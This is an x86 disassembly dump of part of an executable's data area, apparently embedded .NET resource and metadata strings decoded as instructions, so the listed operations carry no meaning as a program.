  407919:	ins    BYTE PTR es:[edi],dx
  40791a:	imul   esp,DWORD PTR [edi+ecx*2+0x70],0x74617265
  407922:	imul   ebp,DWORD PTR [edi+0x6e],0x65637845
  407929:	jo     0x40799f
  40792b:	imul   ebp,DWORD PTR [edi+0x6e],0x74657300
  407932:	pop    edi
  407933:	dec    ecx
  407934:	jae    0x407978
  407936:	popa   
  407937:	arpl   WORD PTR [ebx+0x67],bp
  40793a:	jb     0x4079ab
  40793c:	jne    0x4079ac
  40793e:	add    BYTE PTR fs:[ebx+0x74],dl
  407942:	popa   
  407943:	jb     0x4079b9
  407945:	add    BYTE PTR [edx+0x6f],cl
  407948:	imul   ebp,DWORD PTR [esi+0x0],0x7263694d
  40794f:	outs   dx,DWORD PTR ds:[esi]
  407950:	jae    0x4079c1
  407952:	data16 je 0x407983
  407955:	push   edx
  407956:	gs jo  0x4079c8
  407959:	jb     0x4079cf
  40795b:	imul   ebp,DWORD PTR [esi+0x67],0x76726553
  407962:	imul   esp,DWORD PTR [ebx+0x65],0x61422e73
  407969:	jae    0x4079d0
  40796b:	inc    ebx
  40796c:	ins    DWORD PTR es:[edi],dx
  40796d:	fs dec esp
  40796f:	imul   ebp,DWORD PTR [esi+0x65],0x69727453
  407976:	outs   dx,BYTE PTR ds:[esi]
  407977:	addr16 jae 0x4079a8
  40797a:	jb     0x4079e1
  40797c:	jae    0x4079ed
  40797e:	jne    0x4079f2
  407980:	arpl   WORD PTR [ebp+0x73],sp
  407983:	add    BYTE PTR [ebp+0x69],cl
  407986:	arpl   WORD PTR [edx+0x6f],si
  407989:	jae    0x4079fa
  40798b:	data16 je 0x4079bc
  40798e:	push   edx
  40798f:	gs jo  0x407a01
  407992:	jb     0x407a08
  407994:	imul   ebp,DWORD PTR [esi+0x67],0x76726553
  40799b:	imul   esp,DWORD PTR [ebx+0x65],0x72502e73
  4079a2:	gs jbe 0x407a0e
  4079a5:	gs ja  0x4079f0
  4079a8:	outs   dx,DWORD PTR ds:[esi]
  4079a9:	jae    0x407a1f
  4079ab:	push   ebx
  4079ac:	je     0x407a20
  4079ae:	imul   ebp,DWORD PTR [esi+0x67],0x65722e73
  4079b5:	jae    0x407a26
  4079b7:	jne    0x407a2b
  4079b9:	arpl   WORD PTR [ebp+0x73],sp
  4079bc:	add    BYTE PTR [eax],al
  4079be:	add    BYTE PTR [eax],al
  4079c0:	add    BYTE PTR ds:0x73006d,ch
  4079c6:	sub    eax,0x65006800
  4079cb:	add    BYTE PTR [eax+eax*1+0x70],ch
  4079cf:	add    BYTE PTR [edx],bh
  4079d1:	add    BYTE PTR [edi],ch
  4079d3:	add    BYTE PTR [edi],ch
  4079d5:	add    BYTE PTR [ebp+0x0],cl
  4079d8:	push   ebx
  4079d9:	add    BYTE PTR [esi],ch
  4079db:	add    BYTE PTR [ebx+0x0],dl
  4079de:	push   ecx
  4079df:	add    BYTE PTR [eax+eax*1+0x43],cl
  4079e3:	add    BYTE PTR [ebx+0x0],al
  4079e6:	add    BYTE PTR cs:[esi+0x0],dh
  4079ea:	xor    DWORD PTR [eax],eax
  4079ec:	xor    DWORD PTR [eax],eax
  4079ee:	add    DWORD PTR ds:0xa000a,eax
  4079f4:	add    BYTE PTR ds:0x6e0049,bl
  4079fa:	je     0x4079fc
  4079fc:	add    BYTE PTR gs:[edx+0x0],dh
  407a00:	outs   dx,BYTE PTR ds:[esi]
  407a01:	add    BYTE PTR [ecx+0x0],ah
  407a04:	ins    BYTE PTR es:[edi],dx
  407a05:	add    BYTE PTR [eax],ah
  407a07:	add    BYTE PTR [ebp+0x0],al
  407a0a:	jb     0x407a0c
  407a0c:	jb     0x407a0e
  407a0e:	outs   dx,DWORD PTR ds:[esi]
  407a0f:	add    BYTE PTR [edx+0x0],dh
  407a12:	add    BYTE PTR [ecx],dh
  407a14:	dec    ecx
  407a15:	add    BYTE PTR [esi+0x0],ch
  407a18:	jbe    0x407a1a
  407a1a:	popa   
  407a1b:	add    BYTE PTR [eax+eax*1+0x69],ch
  407a1f:	add    BYTE PTR [eax+eax*1+0x43],ah
  407a23:	add    BYTE PTR [edi+0x0],ch
  407a26:	ins    DWORD PTR es:[edi],dx
  407a27:	add    BYTE PTR [ebp+0x0],ch
  407a2a:	popa   
  407a2b:	add    BYTE PTR [esi+0x0],ch
  407a2e:	add    BYTE PTR fs:[eax+eax*1+0x69],cl
  407a33:	add    BYTE PTR [esi+0x0],ch
  407a36:	add    BYTE PTR gs:[edi+0x0],cl
  407a3a:	jo     0x407a3c
  407a3c:	je     0x407a3e
  407a3e:	imul   eax,DWORD PTR [eax],0x6e006f
  407a44:	add    BYTE PTR ds:0x750044,dh
  407a4a:	jo     0x407a4c
  407a4c:	ins    BYTE PTR es:[edi],dx
  407a4d:	add    BYTE PTR [ecx+0x0],ch
  407a50:	arpl   WORD PTR [eax],ax
  407a52:	popa   
  407a53:	add    BYTE PTR [eax+eax*1+0x65],dh
  407a57:	add    BYTE PTR [ebx+0x0],al
  407a5a:	outs   dx,DWORD PTR ds:[esi]
  407a5b:	add    BYTE PTR [ebp+0x0],ch
  407a5e:	ins    DWORD PTR es:[edi],dx
  407a5f:	add    BYTE PTR [ecx+0x0],ah
  407a62:	outs   dx,BYTE PTR ds:[esi]
  407a63:	add    BYTE PTR [eax+eax*1+0x4c],ah
  407a67:	add    BYTE PTR [ecx+0x0],ch
  407a6a:	outs   dx,BYTE PTR ds:[esi]
  407a6b:	add    BYTE PTR [ebp+0x0],ah
  407a6e:	dec    edi
  407a6f:	add    BYTE PTR [eax+0x0],dh
  407a72:	je     0x407a74
  407a74:	imul   eax,DWORD PTR [eax],0x6e006f
  407a7a:	add    BYTE PTR ds:0x69004d,ah
  407a80:	jae    0x407a82
  407a82:	jae    0x407a84
  407a84:	imul   eax,DWORD PTR [eax],0x67006e
  407a8a:	dec    edi
  407a8b:	add    BYTE PTR [eax+0x0],dh
  407a8e:	je     0x407a90
  407a90:	imul   eax,DWORD PTR [eax],0x6e006f
  407a96:	push   esi
  407a97:	add    BYTE PTR [ecx+0x0],ah
  407a9a:	ins    BYTE PTR es:[edi],dx
  407a9b:	add    BYTE PTR [ebp+0x0],dh
  407a9e:	add    BYTE PTR gs:[eax],al
  407aa1:	daa    
  407aa2:	push   ebx
  407aa3:	add    BYTE PTR [ebp+0x0],dh
  407aa6:	arpl   WORD PTR [eax],ax
  407aa8:	arpl   WORD PTR [eax],ax
  407aaa:	add    BYTE PTR gs:[ebx+0x0],dh
  407aae:	jae    0x407ab0
  407ab0:	data16 add BYTE PTR [ebp+0x0],dh
  407ab4:	ins    BYTE PTR es:[edi],dx
  407ab5:	add    BYTE PTR [ebp+0x0],al
  407ab8:	js     0x407aba
  407aba:	add    BYTE PTR gs:[ebx+0x0],ah
  407abe:	jne    0x407ac0
  407ac0:	je     0x407ac2
  407ac2:	imul   eax,DWORD PTR [eax],0x6e006f
  407ac8:	add    BYTE PTR [ebp+0x4d],bl
  407acb:	add    BYTE PTR [ecx+0x0],ch
  407ace:	arpl   WORD PTR [eax],ax
  407ad0:	jb     0x407ad2
  407ad2:	outs   dx,DWORD PTR ds:[esi]
  407ad3:	add    BYTE PTR [ebx+0x0],dh
  407ad6:	outs   dx,DWORD PTR ds:[esi]
  407ad7:	add    BYTE PTR [esi+0x0],ah
  407ada:	je     0x407adc
  407adc:	add    BYTE PTR cs:[edx+0x0],dl
  407ae0:	add    BYTE PTR gs:[eax+0x0],dh
  407ae4:	outs   dx,DWORD PTR ds:[esi]
  407ae5:	add    BYTE PTR [edx+0x0],dh
  407ae8:	je     0x407aea
  407aea:	imul   eax,DWORD PTR [eax],0x67006e
  407af0:	push   ebx
  407af1:	add    BYTE PTR [ebp+0x0],ah
  407af4:	jb     0x407af6
  407af6:	jbe    0x407af8
  407af8:	imul   eax,DWORD PTR [eax],0x650063
  407afe:	jae    0x407b00
  407b00:	add    BYTE PTR cs:[edx+0x0],al
  407b04:	popa   
  407b05:	add    BYTE PTR [ebx+0x0],dh
  407b08:	add    BYTE PTR gs:[ebx+0x0],al
  407b0c:	ins    DWORD PTR es:[edi],dx
  407b0d:	add    BYTE PTR [eax+eax*1+0x4c],ah
  407b11:	add    BYTE PTR [ecx+0x0],ch
  407b14:	outs   dx,BYTE PTR ds:[esi]
  407b15:	add    BYTE PTR [ebp+0x0],ah
  407b18:	push   ebx
  407b19:	add    BYTE PTR [eax+eax*1+0x72],dh
  407b1d:	add    BYTE PTR [ecx+0x0],ch
  407b20:	outs   dx,BYTE PTR ds:[esi]
  407b21:	add    BYTE PTR [edi+0x0],ah
  407b24:	jae    0x407b26
  407b26:	add    BYTE PTR [edi+0x44],ah
  407b29:	add    BYTE PTR [ecx+0x0],ch
  407b2c:	jb     0x407b2e
  407b2e:	add    BYTE PTR gs:[ebx+0x0],ah
  407b32:	je     0x407b34
  407b34:	and    BYTE PTR [eax],al
  407b36:	jb     0x407b38
  407b38:	add    BYTE PTR gs:[eax+0x0],dh
  407b3c:	outs   dx,DWORD PTR ds:[esi]
  407b3d:	add    BYTE PTR [edx+0x0],dh
  407b40:	je     0x407b42
  407b42:	and    BYTE PTR [eax],al
  407b44:	add    BYTE PTR fs:[ebp+0x0],ah
  407b48:	data16 add BYTE PTR [ecx+0x0],ch
  407b4c:	outs   dx,BYTE PTR ds:[esi]
  407b4d:	add    BYTE PTR [ecx+0x0],ch
  407b50:	je     0x407b52
  407b52:	imul   eax,DWORD PTR [eax],0x6e006f
  407b58:	jae    0x407b5a
  407b5a:	and    BYTE PTR [eax],al
  407b5c:	popa   
  407b5d:	add    BYTE PTR [edx+0x0],dh
  407b60:	add    BYTE PTR gs:[eax],ah
  407b63:	add    BYTE PTR [esi+0x0],ch
  407b66:	outs   dx,DWORD PTR ds:[esi]
  407b67:	add    BYTE PTR [eax+eax*1+0x20],dh
  407b6b:	add    BYTE PTR [ebx+0x0],dh
  407b6e:	jne    0x407b70
  407b70:	jo     0x407b72
  407b72:	jo     0x407b74
  407b74:	outs   dx,DWORD PTR ds:[esi]
  407b75:	add    BYTE PTR [edx+0x0],dh
  407b78:	je     0x407b7a
  407b7a:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  407b7f:	add    BYTE PTR [ecx+0x0],ch
  407b82:	outs   dx,BYTE PTR ds:[esi]
  407b83:	add    BYTE PTR [eax],ah
  407b85:	add    BYTE PTR [edx+0x0],al
  407b88:	dec    ecx
  407b89:	add    BYTE PTR [eax+eax*1+0x53],al
  407b8d:	add    BYTE PTR [eax],al
  407b8f:	sbb    DWORD PTR [ecx+0x0],eax
  407b92:	arpl   WORD PTR [eax],ax
  407b94:	arpl   WORD PTR [eax],ax
  407b96:	add    BYTE PTR gs:[ebx+0x0],dh
  407b9a:	jae    0x407b9c
  407b9c:	inc    esp
  407b9d:	add    BYTE PTR [ebp+0x0],ah
  407ba0:	outs   dx,BYTE PTR ds:[esi]
  407ba1:	add    BYTE PTR [ecx+0x0],ch
  407ba4:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  407ba9:	dec    ebp
  407baa:	push   ebp
  407bab:	add    BYTE PTR [esi+0x0],ch
  407bae:	add    BYTE PTR gs:[eax+0x0],bh
  407bb2:	jo     0x407bb4
  407bb4:	add    BYTE PTR gs:[ebx+0x0],ah
  407bb8:	je     0x407bba
  407bba:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  407bbf:	add    BYTE PTR [eax+0x0],dh
  407bc2:	popa   
  407bc3:	add    BYTE PTR [edx+0x0],dh
  407bc6:	popa   
  407bc7:	add    BYTE PTR [eax+eax*1+0x6c],ch
  407bcb:	add    BYTE PTR [ebp+0x0],ah
  407bce:	ins    BYTE PTR es:[edi],dx
  407bcf:	add    BYTE PTR [eax],ah
  407bd1:	add    BYTE PTR [edx+0x0],dh
  407bd4:	add    BYTE PTR gs:[esi+0x0],ch
  407bd8:	add    BYTE PTR fs:[ebp+0x0],ah
  407bdc:	jb     0x407bde
  407bde:	imul   eax,DWORD PTR [eax],0x67006e
  407be4:	and    BYTE PTR [eax],al
  407be6:	jb     0x407be8
  407be8:	add    BYTE PTR gs:[ecx+0x0],dh
  407bec:	jne    0x407bee
  407bee:	add    BYTE PTR gs:[ebx+0x0],dh
  407bf2:	je     0x407bf4
  407bf4:	jae    0x407bf6
  407bf6:	add    BYTE PTR [ecx+0x42],al
  407bf9:	add    BYTE PTR [ecx+0x0],ah
  407bfc:	arpl   WORD PTR [eax],ax
  407bfe:	imul   eax,DWORD PTR [eax],0x67
  407c01:	add    BYTE PTR [edx+0x0],dh
  407c04:	outs   dx,DWORD PTR ds:[esi]
  407c05:	add    BYTE PTR [ebp+0x0],dh
  407c08:	outs   dx,BYTE PTR ds:[esi]
  407c09:	add    BYTE PTR [eax+eax*1+0x20],ah
  407c0d:	add    BYTE PTR [ebx+0x0],ah
  407c10:	popa   
  407c11:	add    BYTE PTR [esi+0x0],ch
  407c14:	arpl   WORD PTR [eax],ax
  407c16:	add    BYTE PTR gs:[eax+eax*1+0x6c],ch
  407c1b:	add    BYTE PTR [ecx+0x0],ah
  407c1e:	bound  eax,QWORD PTR [eax]
  407c20:	ins    BYTE PTR es:[edi],dx
  407c21:	add    BYTE PTR [ebp+0x0],ah
  407c24:	and    BYTE PTR [eax],al
  407c26:	outs   dx,DWORD PTR ds:[esi]
  407c27:	add    BYTE PTR [eax+0x0],dh
  407c2a:	add    BYTE PTR gs:[edx+0x0],dh
  407c2e:	popa   
  407c2f:	add    BYTE PTR [eax+eax*1+0x69],dh
  407c33:	add    BYTE PTR [edi+0x0],ch
  407c36:	outs   dx,BYTE PTR ds:[esi]
  407c37:	add    BYTE PTR [eax],al
  407c39:	add    BYTE PTR [eax],al
  407c3b:	add    BYTE PTR [edx+0x4d37008a],al
  407c41:	call   0x337a:0xc7b84e8a
  407c48:	mov    dh,0x8b
  407c4a:	fs xchg ebp,eax
  407c4c:	add    BYTE PTR [eax],cl
  407c4e:	mov    bh,0x7a
  407c50:	pop    esp
  407c51:	push   esi
  407c52:	sbb    DWORD PTR [eax+eiz*8],esi
  407c55:	mov    DWORD PTR [eax],ecx
  407c57:	mov    DWORD PTR [ebp+ebx*2-0x337f7f33],eax
  407c5e:	xchg   ecx,eax
  407c5f:	add    al,BYTE PTR [esi]
  407c61:	push   cs
  407c62:	adc    BYTE PTR [ecx],dh
  407c64:	add    BYTE PTR [ecx],dh
  407c66:	add    BYTE PTR [esi],ch
  407c68:	add    BYTE PTR [eax],dh
  407c6a:	add    BYTE PTR [esi],ch
  407c6c:	add    BYTE PTR [eax],dh
  407c6e:	add    BYTE PTR [esi],ch
  407c70:	add    BYTE PTR [eax],dh
  407c72:	add    BYTE PTR [edx],al
  407c74:	push   es
  407c75:	or     BYTE PTR [ebx+ecx*1],al
  407c78:	add    BYTE PTR [eax],al
  407c7a:	add    BYTE PTR [eax+eax*1],al
  407c7d:	add    BYTE PTR [eax],al
  407c7f:	add    BYTE PTR [esp+esi*1],al
  407c82:	or     BYTE PTR [eax],al
  407c84:	add    BYTE PTR [eax],cl
  407c86:	xor    DWORD PTR [eax],eax
  407c88:	xor    DWORD PTR [eax],eax
  407c8a:	add    BYTE PTR cs:[eax],dh
  407c8d:	add    BYTE PTR [eax],ch
  407c8f:	dec    ebp
  407c90:	add    BYTE PTR [ecx+0x0],ch
  407c93:	arpl   WORD PTR [eax],ax
  407c95:	jb     0x407c97
  407c97:	outs   dx,DWORD PTR ds:[esi]
  407c98:	add    BYTE PTR [ebx+0x0],dh
  407c9b:	outs   dx,DWORD PTR ds:[esi]
  407c9c:	add    BYTE PTR [esi+0x0],ah
  407c9f:	je     0x407ca1
  407ca1:	and    BYTE PTR [eax],al
  407ca3:	push   ebx
  407ca4:	add    BYTE PTR [ecx+0x0],dl
  407ca7:	dec    esp
  407ca8:	add    BYTE PTR [eax],ah
  407caa:	add    BYTE PTR [ebx+0x0],dl
  407cad:	add    BYTE PTR gs:[edx+0x0],dh
  407cb1:	jbe    0x407cb3
  407cb3:	add    BYTE PTR gs:[edx+0x0],dh
  407cb7:	sbb    BYTE PTR [eax+0x30007b],0x78
  407cbe:	add    BYTE PTR [edx+0x0],ah
  407cc1:	add    BYTE PTR fs:[edi],dh
  407cc4:	add    BYTE PTR [esi+0x0],ah
  407cc7:	aaa    
  407cc8:	add    BYTE PTR [ebx+0x0],ah
  407ccb:	xor    BYTE PTR [eax],al
  407ccd:	add    BYTE PTR fs:[eax+eax*1],ch
  407cd1:	and    BYTE PTR [eax],al
  407cd3:	xor    BYTE PTR [eax],al
  407cd5:	js     0x407cd7
  407cd7:	aaa    
  407cd8:	add    BYTE PTR [ebx+0x0],ah
  407cdb:	xor    eax,DWORD PTR [eax]
  407cdd:	add    BYTE PTR ss:[eax+eax*1],ch
  407ce1:	and    BYTE PTR [eax],al
  407ce3:	xor    BYTE PTR [eax],al
  407ce5:	js     0x407ce7
  407ce7:	xor    al,0x0
  407ce9:	aaa    
  407cea:	add    BYTE PTR [edx],dh
  407cec:	add    BYTE PTR [ecx],dh
  407cee:	add    BYTE PTR [eax+eax*1],ch
  407cf1:	and    BYTE PTR [eax],al
  407cf3:	jnp    0x407cf5
  407cf5:	xor    BYTE PTR [eax],al
  407cf7:	js     0x407cf9
  407cf9:	popa   
  407cfa:	add    BYTE PTR [esi+0x0],ah
  407cfd:	sub    al,0x0
  407cff:	and    BYTE PTR [eax],al
  407d01:	xor    BYTE PTR [eax],al
  407d03:	js     0x407d05
  407d05:	popa   
  407d06:	add    BYTE PTR [eax],bh
  407d08:	add    BYTE PTR [eax+eax*1],ch
  407d0b:	and    BYTE PTR [eax],al
  407d0d:	xor    BYTE PTR [eax],al
  407d0f:	js     0x407d11
  407d11:	bound  eax,QWORD PTR [eax]
  407d13:	sub    al,0x0
  407d15:	and    BYTE PTR [eax],al
  407d17:	xor    BYTE PTR [eax],al
  407d19:	js     0x407d1b
  407d1b:	popa   
  407d1c:	add    BYTE PTR [edi],dh
  407d1e:	add    BYTE PTR [eax+eax*1],ch
  407d21:	and    BYTE PTR [eax],al
  407d23:	xor    BYTE PTR [eax],al
  407d25:	js     0x407d27
  407d27:	xor    BYTE PTR [eax],al
  407d29:	sub    al,0x0
  407d2b:	and    BYTE PTR [eax],al
  407d2d:	xor    BYTE PTR [eax],al
  407d2f:	js     0x407d31
  407d31:	add    BYTE PTR gs:[edx],dh
  407d34:	add    BYTE PTR [eax+eax*1],ch
  407d37:	and    BYTE PTR [eax],al
  407d39:	xor    BYTE PTR [eax],al
  407d3b:	js     0x407d3d
  407d3d:	add    BYTE PTR ss:[eax+eax*1+0x2c],ah
  407d42:	add    BYTE PTR [eax],ah
  407d44:	add    BYTE PTR [eax],dh
  407d46:	add    BYTE PTR [eax+0x0],bh
  407d49:	cmp    DWORD PTR [eax],eax
  407d4b:	add    BYTE PTR gs:[ebp+0x0],bh
  407d4f:	jge    0x407d51
  407d51:	push   ds
  407d52:	push   ebx
  407d53:	add    BYTE PTR [ecx+0x0],dl
  407d56:	dec    esp
  407d57:	add    BYTE PTR [eax],ah
  407d59:	add    BYTE PTR [ebx+0x0],dl
  407d5c:	add    BYTE PTR gs:[edx+0x0],dh
  407d60:	jbe    0x407d62
  407d62:	add    BYTE PTR gs:[edx+0x0],dh
  407d66:	and    BYTE PTR [eax],al
  407d68:	xor    al,BYTE PTR [eax]
  407d6a:	xor    BYTE PTR [eax],al
  407d6c:	xor    DWORD PTR [eax],eax
  407d6e:	xor    al,BYTE PTR [eax]
  407d70:	xor    cl,BYTE PTR [ebp+0x0]
  407d73:	imul   eax,DWORD PTR [eax],0x720063
  407d79:	outs   dx,DWORD PTR ds:[esi]
  407d7a:	add    BYTE PTR [ebx+0x0],dh
  407d7d:	outs   dx,DWORD PTR ds:[esi]
  407d7e:	add    BYTE PTR [esi+0x0],ah
  407d81:	je     0x407d83
  407d83:	and    BYTE PTR [eax],al
  407d85:	push   ebx
  407d86:	add    BYTE PTR [ecx+0x0],dl
  407d89:	dec    esp
  407d8a:	add    BYTE PTR [eax],ah
  407d8c:	add    BYTE PTR [ebx+0x0],dl
  407d8f:	add    BYTE PTR gs:[edx+0x0],dh
  407d93:	jbe    0x407d95
  407d95:	add    BYTE PTR gs:[edx+0x0],dh
  407d99:	and    BYTE PTR [eax],al
  407d9b:	xor    al,BYTE PTR [eax]
  407d9d:	xor    BYTE PTR [eax],al
  407d9f:	xor    DWORD PTR [eax],eax
  407da1:	xor    al,BYTE PTR [eax]
  407da3:	push   es
  407da4:	xor    DWORD PTR [eax],eax
  407da6:	xor    DWORD PTR [eax],eax
  407da8:	xor    BYTE PTR [eax],al
  407daa:	or     dh,BYTE PTR [ebx+0x0]
  407dad:	jno    0x407daf
  407daf:	ins    BYTE PTR es:[edi],dx
  407db0:	add    BYTE PTR [ecx],dh
  407db2:	add    BYTE PTR [ecx],dh
  407db4:	add    BYTE PTR [edx],dh
  407db6:	push   ebx
  407db7:	add    BYTE PTR [ecx+0x0],dl
  407dba:	dec    esp
  407dbb:	add    BYTE PTR [ebx+0x0],dl
  407dbe:	add    BYTE PTR gs:[edx+0x0],dh
  407dc2:	jbe    0x407dc4
  407dc4:	add    BYTE PTR gs:[edx+0x0],dh
  407dc8:	inc    edx
  407dc9:	add    BYTE PTR [edi+0x0],ch
  407dcc:	outs   dx,DWORD PTR ds:[esi]
  407dcd:	add    BYTE PTR [ebx+0x0],ch
  407dd0:	jae    0x407dd2
  407dd2:	dec    edi
  407dd3:	add    BYTE PTR [esi+0x0],ch
  407dd6:	ins    BYTE PTR es:[edi],dx
  407dd7:	add    BYTE PTR [ecx+0x0],ch
  407dda:	outs   dx,BYTE PTR ds:[esi]
  407ddb:	add    BYTE PTR [ebp+0x0],ah
  407dde:	add    BYTE PTR cs:[ecx],dh
  407de1:	add    BYTE PTR [ecx],dh
  407de3:	add    BYTE PTR [esi],ch
  407de5:	add    BYTE PTR [eax],dh
  407de7:	add    BYTE PTR [edx],bl
  407de9:	push   ebx
  407dea:	add    BYTE PTR [ecx+0x0],dl
  407ded:	dec    esp
  407dee:	add    BYTE PTR [ebx+0x0],dl
  407df1:	add    BYTE PTR gs:[edx+0x0],dh
  407df5:	jbe    0x407df7
  407df7:	add    BYTE PTR gs:[edx+0x0],dh
  407dfb:	xor    al,BYTE PTR [eax]
  407dfd:	xor    BYTE PTR [eax],al
  407dff:	xor    DWORD PTR [eax],eax
  407e01:	xor    al,BYTE PTR [eax]
  407e03:	dec    eax
  407e04:	aaa    
  407e05:	add    BYTE PTR [esi+0x0],ah
  407e08:	add    BYTE PTR gs:[eax+eax*1],dh
  407e0c:	add    BYTE PTR ss:[ebx],dh
  407e0f:	add    BYTE PTR [eax],dh
  407e11:	add    BYTE PTR [ecx+0x0],ah
  407e14:	sub    eax,0x33003000
  407e19:	add    BYTE PTR [ebx],dh
  407e1b:	add    BYTE PTR [eax],dh
  407e1d:	add    BYTE PTR ds:0x62003400,ch
  407e23:	add    BYTE PTR [eax],dh
  407e25:	add    BYTE PTR [ecx],dh
  407e27:	add    BYTE PTR ds:0x35006100,ch
  407e2d:	add    BYTE PTR [ebp+0x0],ah
  407e30:	add    BYTE PTR ss:0x37006100,ch
  407e37:	add    BYTE PTR [edi],dh
  407e39:	add    BYTE PTR [ebx+0x0],ah
  407e3c:	aaa    
  407e3d:	add    BYTE PTR [ecx+0x0],ah
  407e40:	add    BYTE PTR fs:[ebx],dh
  407e43:	add    BYTE PTR [eax+eax*1],dh
  407e46:	add    BYTE PTR gs:[edx+0x0],ah
  407e4a:	xor    BYTE PTR [eax],al
  407e4c:	dec    esp
  407e4d:	jnp    0x407e4f
  407e4f:	aaa    
  407e50:	add    BYTE PTR [esi+0x0],ah
  407e53:	xor    DWORD PTR [eax],eax
  407e55:	xor    al,BYTE PTR [eax]
  407e57:	xor    DWORD PTR [eax],eax
  407e59:	arpl   WORD PTR [eax],ax
  407e5b:	xor    eax,DWORD PTR [eax]
  407e5d:	xor    eax,0x66002d00
  407e62:	add    BYTE PTR [eax],dh
  407e64:	add    BYTE PTR [ecx],bh
  407e66:	add    BYTE PTR ds:0x34002d00,dh
  407e6c:	add    BYTE PTR [edi],dh
  407e6e:	add    BYTE PTR [ecx+0x0],ah
  407e71:	popa   
  407e72:	add    BYTE PTR ds:0x63006200,ch
  407e78:	add    BYTE PTR [eax],dh
  407e7a:	add    BYTE PTR [eax+eax*1],dh
  407e7d:	sub    eax,0x32006400
  407e82:	add    BYTE PTR [ecx],dh
  407e84:	add    BYTE PTR [eax+eax*1],dh
  407e87:	bound  eax,QWORD PTR [eax]
  407e89:	arpl   WORD PTR [eax],ax
  407e8b:	xor    BYTE PTR [eax],al
  407e8d:	xor    al,0x0
  407e8f:	aaa    
  407e90:	add    BYTE PTR [edx],dh
  407e92:	add    BYTE PTR [edi],dh
  407e94:	add    BYTE PTR [ecx+0x0],ah
  407e97:	jge    0x407e99
  407e99:	push   cs
  407e9a:	push   ebx
  407e9b:	add    BYTE PTR [ecx+0x0],dl
  407e9e:	dec    esp
  407e9f:	add    BYTE PTR [edx],dh
  407ea1:	add    BYTE PTR [eax],dh
  407ea3:	add    BYTE PTR [ecx],dh
  407ea5:	add    BYTE PTR [ecx],dh
  407ea7:	add    BYTE PTR [esi],cl
  407ea9:	dec    ebp
  407eaa:	add    BYTE PTR [ebx+0x0],dl
  407ead:	push   ebx
  407eae:	add    BYTE PTR [ecx+0x0],dl
  407eb1:	dec    esp
  407eb2:	add    BYTE PTR [ecx],dh
  407eb4:	add    BYTE PTR [ecx],dh
  407eb6:	add    BYTE PTR [ecx*2+0x41005300],cl
  407ebd:	add    BYTE PTR [ebx+0x0],dl
  407ec0:	xor    DWORD PTR [eax],eax
  407ec2:	xor    DWORD PTR [eax],eax
  407ec4:	or     al,0x4d
  407ec6:	add    BYTE PTR [ebx+0x0],dl
  407ec9:	push   edx
  407eca:	add    BYTE PTR [ebx+0x0],dl
  407ecd:	xor    DWORD PTR [eax],eax
  407ecf:	xor    DWORD PTR [eax],eax
  407ed1:	add    al,BYTE PTR [esi]
  407ed3:	or     DWORD PTR [esp+esi*4],eax
  407ed6:	add    BYTE PTR [eax],al
  407ed8:	add    BYTE PTR [edx],dl
  407eda:	push   ebx
  407edb:	add    BYTE PTR [ecx+0x0],dl
  407ede:	dec    esp
  407edf:	add    BYTE PTR [ecx],dh
  407ee1:	add    BYTE PTR [ecx],dh
  407ee3:	add    BYTE PTR [eax],dh
  407ee5:	add    BYTE PTR [ebp+0x0],cl
  407ee8:	push   ebx
  407ee9:	add    BYTE PTR [ecx+0x0],cl
  407eec:	push   ds
  407eed:	push   ebx
  407eee:	add    BYTE PTR [ecx+0x0],dl
  407ef1:	dec    esp
  407ef2:	add    BYTE PTR [ecx],dh
  407ef4:	add    BYTE PTR [ecx],dh
  407ef6:	add    BYTE PTR [eax],dh
  407ef8:	add    BYTE PTR [ebp+0x0],al
  407efb:	js     0x407efd
  407efd:	arpl   WORD PTR [eax],ax
  407eff:	add    BYTE PTR gs:[eax+0x0],dh
  407f03:	je     0x407f05
  407f05:	imul   eax,DWORD PTR [eax],0x6e006f
  407f0b:	sbb    BYTE PTR [ebx+edi*2+0x78003000],0x0
  407f13:	xor    al,BYTE PTR [eax]
  407f15:	xor    al,0x0
  407f17:	xor    DWORD PTR [eax],eax
  407f19:	xor    al,0x0
  407f1b:	bound  eax,QWORD PTR [eax]
  407f1d:	arpl   WORD PTR [eax],ax
  407f1f:	xor    DWORD PTR [eax],eax
  407f21:	bound  eax,QWORD PTR [eax]
  407f23:	sub    al,0x0
  407f25:	and    BYTE PTR [eax],al
  407f27:	xor    BYTE PTR [eax],al
  407f29:	js     0x407f2b
  407f2b:	xor    DWORD PTR [eax],eax
  407f2d:	xor    eax,0x32003700
  407f32:	add    BYTE PTR [eax+eax*1],ch
  407f35:	and    BYTE PTR [eax],al
  407f37:	xor    BYTE PTR [eax],al
  407f39:	js     0x407f3b
  407f3b:	xor    al,0x0
  407f3d:	arpl   WORD PTR [eax],ax
  407f3f:	add    BYTE PTR fs:[ecx],bh
  407f42:	add    BYTE PTR [eax+eax*1],ch
  407f45:	and    BYTE PTR [eax],al
  407f47:	jnp    0x407f49
  407f49:	xor    BYTE PTR [eax],al
  407f4b:	js     0x407f4d
  407f4d:	cmp    DWORD PTR [eax],eax
  407f4f:	arpl   WORD PTR [eax],ax
  407f51:	sub    al,0x0
  407f53:	and    BYTE PTR [eax],al
  407f55:	xor    BYTE PTR [eax],al
  407f57:	js     0x407f59
  407f59:	popa   
  407f5a:	add    BYTE PTR ds:0x20002c00,dh
  407f60:	add    BYTE PTR [eax],dh
  407f62:	add    BYTE PTR [eax+0x0],bh
  407f65:	add    BYTE PTR ss:0x20002c00,dh
  407f6c:	add    BYTE PTR [eax],dh
  407f6e:	add    BYTE PTR [eax+0x0],bh
  407f71:	xor    DWORD PTR [eax],eax
  407f73:	add    BYTE PTR ss:[eax+eax*1],ch
  407f77:	and    BYTE PTR [eax],al
  407f79:	xor    BYTE PTR [eax],al
  407f7b:	js     0x407f7d
  407f7d:	add    BYTE PTR ss:[eax+eax*1+0x2c],ah
  407f82:	add    BYTE PTR [eax],ah
  407f84:	add    BYTE PTR [eax],dh
  407f86:	add    BYTE PTR [eax+0x0],bh
  407f89:	cmp    BYTE PTR [eax],al
  407f8b:	add    BYTE PTR fs:[eax+eax*1],ch
  407f8f:	and    BYTE PTR [eax],al
  407f91:	xor    BYTE PTR [eax],al
  407f93:	js     0x407f95
  407f95:	add    BYTE PTR gs:[esi+0x0],ah
  407f99:	sub    al,0x0
  407f9b:	and    BYTE PTR [eax],al
  407f9d:	xor    BYTE PTR [eax],al
  407f9f:	js     0x407fa1
  407fa1:	xor    eax,DWORD PTR [eax]
